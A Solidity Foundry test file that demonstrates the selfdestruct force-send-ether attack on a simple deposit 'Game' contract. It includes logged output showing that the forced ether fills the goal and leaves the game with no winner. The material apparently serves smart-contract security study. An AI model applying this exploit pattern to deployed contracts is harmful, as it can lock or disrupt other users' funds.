//SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test, console } from "forge-std/Test.sol";
import { Game, Cheater } from "../src/ForceEther.sol";

contract ForceEther is Test {
    Game public game;
    Cheater public cheater;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    function setUp() public {
        game = new Game();
        cheater = new Cheater();
        vm.deal(address(cheater), 98 ether);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 2 ether);
    }

    // with selfdestruct, the attacker will bypass the 1ether transfer limit and fill the Game with the GOAL amount of ether
    // there will be no winner, as the winner variable is never set (and defaults to the zero address)
    function testCheaterCanForceSendEtherAndCompromiseTheGame() public {
        setUp();
        console.log(
            "[PRE-ATTACK]:  Initial Game balance: ",
            address(game).balance
        );
        console.log(
            "[PRE-ATTACK]:  Initial Cheater balance: ",
            address(cheater).balance
        );
        console.log("[PRE-ATTACK]:  Current winner: ", game.getWinner());

        // Bob and Alice can deposit and participate in the game with no issues
        vm.prank(alice);
        game.deposit{ value: 1 ether }();
        vm.prank(bob);
        game.deposit{ value: 1 ether }();

        cheater.boom(payable(address(game)));
        vm.prank(bob);
        vm.expectRevert();
        // the 'goal amount' has been filled with the selfdestruct, and the game is now over with no winner
        // bob won't be able to deposit another ether
        game.deposit{ value: 1 ether }();

        assertEq(address(game).balance, 100 ether);
        assertEq(address(cheater).balance, 0);

        console.log(
            "[POST-ATTACK]: Final Game balance: ",
            address(game).balance
        );
        console.log(
            "[POST-ATTACK]: Final Cheater balance: ",
            address(cheater).balance
        );
        console.log("[POST-ATTACK]: Current winner: ", game.getWinner());
    }
}

/*
Ran 1 test for test/ForceEtherTest.t.sol:ForceEther                                                                                                                                             │
   1     │[PASS] testCheaterCanForceSendEtherAndCompromiseTheGame() (gas: 305003)                                                                                                                         │
   2     │Logs:                                                                                                                                                                                           │
   3     │  [PRE-ATTACK]:  Initial Game balance:  0                                                                                                                                                       │
   4     │  [PRE-ATTACK]:  Initial Cheater balance:  98000000000000000000                                                                                                                                 │
   5     │  [PRE-ATTACK]:  Current winner:  0x0000000000000000000000000000000000000000                                                                                                                    │
   6     │  [POST-ATTACK]: Final Game balance:  100000000000000000000                                                                                                                                     │
   7     │  [POST-ATTACK]: Final Cheater balance:  0                                                                                                                                                      │
   8     │  [POST-ATTACK]: Current winner:  0x0000000000000000000000000000000000000000                                                                                                                    │
   9     │                                                                                                                                                                                                │
  10     │Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.96ms (1.66ms CPU time)
*/
